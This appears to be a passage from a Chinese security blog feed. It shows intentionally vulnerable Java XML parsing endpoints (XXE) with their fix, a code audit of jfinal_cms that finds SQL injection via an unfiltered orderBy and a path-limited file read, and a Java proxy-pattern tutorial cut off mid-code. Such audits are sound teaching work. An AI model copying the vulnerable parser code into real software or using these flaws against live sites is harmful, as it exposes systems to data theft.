function">DigesterVuln</span><span class="token punctuation">(</span>HttpServletRequest request<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>        String body <span class="token operator">=</span> WebUtils<span class="token punctuation">.</span><span class="token function">getRequestBody</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>        logger<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>        Digester digester <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Digester</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        digester<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringReader</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// parse xml</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>        logger<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> EXCEPT<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token string">"Digester xxe vuln code"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="DocumentBuilder"><a href="#DocumentBuilder" class="headerlink" title="DocumentBuilder"></a>DocumentBuilder</h3><p>javax.xml.parsers包中的DocumentBuilderFactory用于创建DOM模式的解析器对象，当使用默认的解析方法并且未对XML进行过滤时，就会产生XXE漏洞。跟上面讲到的函数不同，其触发的XXE漏洞是有回显的。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"/DocumentBuilder/vuln01"</span><span class="token punctuation">,</span> method <span class="token operator">=</span> RequestMethod<span class="token punctuation">.</span>POST<span class="token punctuation">)</span><span class="token keyword">public</span> String <span class="token function">DocumentBuilderVuln01</span><span class="token punctuation">(</span>HttpServletRequest request<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>        String body <span class="token operator">=</span> WebUtils<span class="token punctuation">.</span><span class="token function">getRequestBody</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>        logger<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>        DocumentBuilderFactory dbf <span class="token operator">=</span> DocumentBuilderFactory<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        DocumentBuilder db <span class="token operator">=</span> dbf<span class="token punctuation">.</span><span class="token function">newDocumentBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        StringReader sr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringReader</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>        InputSource is <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InputSource</span><span class="token punctuation">(</span>sr<span class="token punctuation">)</span><span class="token punctuation">;</span>        Document document <span class="token operator">=</span> db<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>is<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// parse xml</span>            <span class="token comment" spellcheck="true">// 遍历xml节点name和value</span>        StringBuilder buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        NodeList rootNodeList <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getChildNodes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> rootNodeList<span class="token punctuation">.</span><span class="token function">getLength</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            Node rootNode <span class="token operator">=</span> rootNodeList<span class="token punctuation">.</span><span class="token function">item</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            NodeList child <span class="token operator">=</span> rootNode<span class="token punctuation">.</span><span class="token function">getChildNodes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> child<span class="token punctuation">.</span><span class="token function">getLength</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                Node node <span class="token operator">=</span> child<span class="token punctuation">.</span><span class="token function">item</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>                buf<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"%s: %s\n"</span><span class="token punctuation">,</span> node<span class="token punctuation">.</span><span class="token function">getNodeName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> node<span class="token punctuation">.</span><span class="token function">getTextContent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        sr<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> buf<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>        logger<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> EXCEPT<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x03-XXE修复"><a href="#0x03-XXE修复" class="headerlink" title="0x03 XXE修复"></a>0x03 XXE修复</h2><p>对于XXE的修复通用方式就是在使用XML解析时设置其属性，禁用DTD或者禁止使用外部实体。</p><pre><code>//实例化解析类之后通常会支持三个配置obj.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);obj.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);obj.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</code></pre><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>除了在java代码审计中学习xxe外，后面还得继续学习xxe的更多利用方式。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>对jfinal_cms一次代码审计</title>
      <link href="/2022/10/18/dui-jfinal-cms-yi-ci-dai-ma-shen-ji/"/>
      <url>/2022/10/18/dui-jfinal-cms-yi-ci-dai-ma-shen-ji/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>如果你不出去走走，你就会以为这就是世界。</p><h2 id="0x01-关于项目"><a href="#0x01-关于项目" class="headerlink" title="0x01 关于项目"></a>0x01 关于项目</h2><p>jfinal cms是一个java开发的功能强大的信息咨询网站，采用了简洁强大的JFinal作为web框架，模板引擎用的是beetl，数据库用mysql，前端bootstrap框架。</p><h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p>1）、数据库的创建</p><p>配置src/main/resources/conf/db.properties为你的数据库名和密码</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221018185653377.png"></p><p>将sql/jfinal_cms_v4.sql导入数据库中即可。</p><p>2）、mvn install</p><p>运行<code>mvn install</code>，提示<code>BUILD SUCCESS</code>即可。</p><p>3）、mvn tomcat:run</p><p>运行mvn tomcat:run来启动程序</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221018190838235.png"></p><p>打开<code>http://localhost/jfinal_cms/</code></p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221018190940568.png"></p><h2 id="0x03、审计过程"><a href="#0x03、审计过程" class="headerlink" title="0x03、审计过程"></a>0x03、审计过程</h2><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>漏洞存在于<code>src/main/java/com/jflyfox/modules/admin/article/ArticleController.java</code>，在第51行，将<code>getBaseForm().getOrderBy()</code>赋值给变量orderBy，再来看看这两个函数具体实现</p><p>getBaseForm()</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> BaseForm <span class="token function">getBaseForm</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    BaseForm form <span class="token operator">=</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">getAttr</span><span class="token punctuation">(</span><span class="token string">"form"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> form <span class="token operator">==</span> null <span class="token operator">?</span> <span class="token keyword">new</span> <span class="token class-name">BaseForm</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> form<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>getOrderBy()</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> String <span class="token function">getOrderBy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>StrUtils<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token function">getOrderColumn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token string">" "</span> <span class="token operator">+</span> <span class="token function">getOrderColumn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> <span class="token function">getOrderAsc</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" "</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当orderBy不为空时，则将orderBy拼接到sql语句中， 且没有经过任何过滤。</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221018223241945.png"></p><p>复现如下：</p><p>漏洞地址：<code>http://192.168.3.2/jfinal_cms/admin/article/list</code></p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221018224120087.png"></p><p>全局搜索<code>getBaseForm().getOrderBy()</code>，可以发现多处有相同的调用方式。</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221018224412194.png"></p><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><p>这个漏洞比较鸡肋，只能读取webapp下的文件，比如WEB-INF\web.xml。漏洞产生于模块管理处，即<code>src/main/java/com/jflyfox/modules/filemanager/FileManagerController.java</code>，先来看看它怎么处理传进来的<code>path</code>的。</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221019010449203.png"></p><p>第58行和59行定义了需要的参数是<code>mode</code>和<code>path</code>，在第69行对传入的参数<code>path</code>进行了处理，跟进setGetVar方法看看</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221019010859813.png"></p><p>当传入的<code>path</code>不为空时，将传入的<code>path</code>通过scanitize方法进行处理，继续跟进</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221019011027978.png"></p><p>可以看到，当我们传入的<code>path</code>含有敏感字符时，则替换为空。</p><p>了解到怎么对路径做处理后，我们跟进到第110行，当<code>mode</code>参数为download且<code>needPath</code>为true时,进入download方法，我们跟进去看看</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221019011335209.png"></p><p>download()</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221019011621583.png"></p><p>分析getRealFilePath()方法</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221019011926287.png"></p><p>可以传入File()中的值为根目录+<code>path</code>的参数值，返回到download()方法，如果路径存在，则在594行进入readFile方法，跟进到readFile方法</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221019012126209.png"></p><p>这里就不用加多阐述了，典型的文件IO流。复现结果如下：</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221019012228609.png"></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java之代理模式</title>
      <link href="/2022/10/15/java-zhi-dai-li-mo-shi/"/>
      <url>/2022/10/15/java-zhi-dai-li-mo-shi/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-代理模式"><a href="#0x00-代理模式" class="headerlink" title="0x00 代理模式"></a>0x00 代理模式</h2><p>我们先了解什么是代理。</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221024015737498.png"></p><p>正常来说，客户可以直接从厂家拿货，但是现实生活来说，这个方式可能性不大，一般是厂家委托商家进行商品销售，客户和商家打交道购买商品，而不与厂家进行直接性关联，这个时候，我们可以把商家看作是代理，用于客户和厂家联系的中间人。这其中就是代理模式的体现，商家代理了厂家对象，提供商品销售的方法。</p><p>代理模式是面向对象编程中的一种常见设计模式，以下是代理模式UML类图</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221024020430921.png"></p><h2 id="0x01-静态代理"><a href="#0x01-静态代理" class="headerlink" title="0x01 静态代理"></a>0x01 静态代理</h2><p>我们以上面提到的场景为例子来尝试编写代码。</p><p>1、静态代理接口：Commodity.java</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>root<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Commodity</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">buy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2、静态代理实现类：Company.java</p><p>用于实现接口的类</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>root<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Company</span> <span class="token keyword">implements</span> <span class="token class-name">Commodity</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">buy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"正在购买商品"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3、静态代理类：proxy.java</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>root<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">proxy</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> Company company<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">proxy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token function">proxy</span><span class="token punctuation">(</span>Company company<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>company <span class="token operator">=</span> company<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">buy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        company<span class="token punctuation">.</span><span class="token function">buy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过组合的方式将Company作为一个私有的属性，然后通过company.buy()来调用buy()，这样用户直接与proxy接触，而不用去改动业务层的代码。</p><p>4、编写一个代表客户的类：Client.java</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>root<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">client</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Company company <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Company</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        proxy Proxy <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">proxy</span><span class="token punctuation">(</span>company<span class="token punctuation">)</span><span class="token punctuation">;</span>        Proxy<span class="token punctuation">.</span><span class="token function">buy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试结果如下：</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221024023332955.png"></p><p><strong>优点：</strong></p><ul><li>可以使得我们的真实角色更加纯粹 . 不再去关注一些公共的事情；</li><li>公共的业务由代理来完成 . 实现了业务的分工；</li><li>公共业务发生扩展时变得更加集中和方便 。</li></ul><p><strong>缺点 :</strong></p><ul><li>不易维护，一旦接口增加方法，目标对象与代理对象都要进行修改。</li></ul><h2 id="0x02-动态代理"><a href="#0x02-动态代理" class="headerlink" title="0x02 动态代理"></a>0x02 动态代理</h2><p>动态代理的代理是在内存中动态地构建对象，通过这种方式来实现代理功能，它跟静态代理地区别在于静态代理的代理功能是我们写的，在编译时就已经实现，编译后是一个实际的class文件，而动态代理是在运行时动态生成的，这就说明他在编译后是没有class文件的。</p><p>动态代理我们主要关注两个类：</p><p><code>java.lang.reflect.Proxy</code></p><p>主要方法有newProxyInstance：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> Object <span class="token function">newProxyInstance</span><span class="token punctuation">(</span>ClassLoader loader<span class="token punctuation">,</span>Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span><span class="token punctuation">[</span><span class="token punctuation">]</span> interfaces<span class="token punctuation">,</span>InvocationHandler h<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>java.lang.reflect.InvocationHandler</code></p><p>主要方法有invoke</p><pre class="line-numbers language-java"><code class="language-java">Object <span class="token function">invoke</span><span class="token punctuation">(</span>Object proxy<span class="token punctuation">,</span> Method method<span class="token punctuation">,</span> Object<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>代码实现：<strong>用户的增删改查</strong></p><p>1、动态代理的接口类：UserService.java</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>root<span class="token punctuation">.</span>proxy3<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">UserService</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2、动态代理的实现类：UserServiceImpl.java</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>root<span class="token punctuation">.</span>proxy3<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>root<span class="token punctuation">.</span>proxy3<span class="token punctuation">.</span>UserService<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserServiceImpl</span> <span class="token keyword">implements</span> <span class="token class-name">UserService</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"增加一个用户"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"更新一个用户"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"删除一个用户"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"查询一个用户"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3、动态代理类：UserServiceProxy.java</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>root<span class="token punctuation">.</span>proxy3<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>InvocationHandler<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Method<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Proxy<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserServiceProxy</span> <span class="token keyword">implements</span> <span class="token class-name">InvocationHandler</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> Object target<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setUserService</span><span class="token punctuation">(</span>Object target<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>target <span class="token operator">=</span> target<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//生成代理类</span>    <span class="token keyword">public</span> Object <span class="token function">getproxy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> Proxy<span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>target<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInterfaces</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//处理代理实例并返回结果</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> Object <span class="token function">invoke</span><span class="token punctuation">(</span>Object proxy<span class="token punctuation">,</span> Method method<span class="token punctuation">,</span> Object<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Throwable <span class="token punctuation">{</span>        Object result <span class="token operator">=</span> method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> result<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>4、主函数：Client.java</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>root<span class="token punctuation">.</span>proxy3<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>root<span class="token punctuation">.</span>proxy3<span class="token punctuation">.</span>UserService<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>root<span class="token punctuation">.</span>proxy3<span class="token punctuation">.</span>UserServiceImpl<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>root<span class="token punctuation">.</span>proxy3<span class="token punctuation">.</span>UserServiceProxy<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Client</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        UserServiceImpl userService <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UserServiceImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        UserServiceProxy userServiceProxy <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UserServiceProxy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        userServiceProxy<span class="token punctuation">.</span><span class="token 